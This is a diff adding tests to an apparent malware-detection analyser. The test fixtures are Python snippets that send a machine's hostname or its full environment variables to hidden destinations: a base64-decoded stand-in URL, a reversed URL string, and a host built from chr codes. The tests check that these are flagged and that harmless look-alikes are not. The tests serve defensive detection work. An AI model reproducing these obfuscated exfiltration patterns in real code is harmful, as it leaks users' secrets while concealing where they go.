@@ -225,6 +225,82 @@ class TestThroughAClientAndAContainer:
         assert Flow.sent(source) == []
 
 
+class TestAHiddenDestination:
+    """Group A (a): a request whose destination the file kept hidden (decoded, reversed, built from
+    chr codes) carries ` dest=decoded`. tsshare 1.0.2 sends the device identity to a base64-decoded
+    base URL; snapshot-photo 0.0.3 posts to `self.endp[::-1] + year`."""
+
+    @staticmethod
+    def details(source: str) -> list[str]:
+        return [
+            h.detail
+            for h in PythonAnalyzer.analyse(source)
+            if h.detail.startswith(("identity sent", "environment sent", "hidden request"))
+        ]
+
+    def test_identity_to_a_decoded_base_url_held_on_self(self):
+        source = (
+            "import base64, platform, requests\n"
+            "_E = 'aHR0cHM6Ly9jb2xsZWN0b3IuZXhhbXBsZS5pbnZhbGlk'\n"
+            "def _base():\n"
+            "    return base64.b64decode(_E).decode()\n"
+            "class Client:\n"
+            "    def __init__(self):\n"
+            "        self.base = _base()\n"
+            "    def query(self):\n"
+            "        return requests.post(self.base + '/q', json={'h': platform.node()})\n"
+        )
+        assert "identity sent: requests.post dest=decoded" in self.details(source)
+
+    def test_a_request_to_a_reversed_url_is_a_hidden_request(self):
+        source = (
+            "import json\n"
+            "from urllib import request\n"
+            "class Fmt:\n"
+            "    def __init__(self):\n"
+            "        self.endp = '/dilavni.elpmaxe.rotcelloc//:sptth'\n"
+            "    def get(self, day):\n"
+            "        url = self.endp[::-1] + day\n"
+            "        req = request.Request(url=url, data=json.dumps({'d': day}).encode())\n"
+            "        request.urlopen(req)\n"
+        )
+        assert self.details(source) == ["hidden request: urllib.request.urlopen dest=decoded"]
+
+    def test_the_environment_to_a_host_built_from_chr_codes(self):
+        source = (
+            "import os, json, requests\n"
+            "host = ''.join(chr(c) for c in [104, 116, 116, 112])\n"
+            "requests.post(host, data=json.dumps(dict(os.environ)))\n"
+        )
+        details = self.details(source)
+        assert "environment sent: requests.post dest=decoded" in details
+        assert "hidden request: requests.post dest=decoded" in details
+
+    def test_a_url_read_from_config_is_not_hidden(self):
+        source = (
+            "import json, platform, requests\n"
+            "url = json.load(open('config.json'))['url']\n"
+            "requests.post(url, json={'h': platform.node()})\n"
+        )
+        assert self.details(source) == ["identity sent: requests.post"]
+
+    def test_a_decoded_fixture_never_requested_is_not(self):
+        source = (
+            "import base64, requests\n"
+            "fixture = base64.b64decode('aGVsbG8=')\n"
+            "requests.get('https://api.example.invalid/x', params={'q': 'a'})\n"
+        )
+        assert self.details(source) == []
+
+    def test_a_reversed_string_that_is_not_the_url_is_not(self):
+        source = (
+            "import requests\n"
+            "word = 'olleh'[::-1]\n"
+            "requests.get('https://api.example.invalid/echo', params={'w': word})\n"
+        )
+        assert self.details(source) == []
+
+
 class TestAWalletKeySent:
     """Group A (a) step 2: a wallet signs with its key locally and never sends it (web3_py_checksum
     1.1 put `account.key.hex()` in a chat-bot URL). A homeless credential: any written host is out."""
